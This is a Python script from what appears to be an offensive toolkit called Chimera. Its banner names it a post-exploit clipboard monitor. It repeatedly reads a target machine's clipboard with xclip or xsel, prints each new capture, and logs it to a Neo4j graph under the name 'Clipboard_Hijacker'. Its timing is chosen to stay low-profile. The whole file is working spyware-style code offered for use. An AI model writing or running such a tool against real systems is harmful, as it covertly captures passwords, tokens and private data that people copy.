import os
import sys
import time
import subprocess

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def get_clipboard():
    """Attempts to fetch clipboard content using common Linux utilities."""
    try:
        # Try xclip first (most common on Kali/Ubuntu)
        return subprocess.check_output(['xclip', '-selection', 'clipboard', '-o'], 
                                    stderr=subprocess.DEVNULL).decode('utf-8').strip()
    except:
        try:
            # Fallback to xsel
            return subprocess.check_output(['xsel', '--clipboard', '--output'], 
                                        stderr=subprocess.DEVNULL).decode('utf-8').strip()
        except:
            return None

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[93m" + "="*60)
    print("   CHIMERA AGENT 37 :: POST-EXPLOIT CLIPBOARD MONITOR")
    print("="*60 + "\033[0m")

    target_name = input("[?] Target Hostname/ID: ").strip()
    print(f"[*] Monitoring clipboard on {target_name}. Press Ctrl+C to stop.")

    last_content = ""
    
    try:
        while True:
            current_content = get_clipboard()
            
            if current_content and current_content != last_content:
                timestamp = time.strftime("%H:%M:%S")
                print(f"[{timestamp}] \033[92m[+] New Clipboard Data Captured!\033[0m")
                print(f"--- \n{current_content}\n---")
                
                # Log to the Neo4j Graph
                db.report_finding("37_Clipboard_Hijacker", "Clipboard_Capture", {
                    "host": target_name,
                    "content": current_content,
                    "severity": "HIGH"
                })
                
                last_content = current_content
            
            time.sleep(3) # Check every 3 seconds to stay low-profile
            
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped. Data remains in Neo4j.")
    finally:
        db.close()

if __name__ == "__main__":
    run()
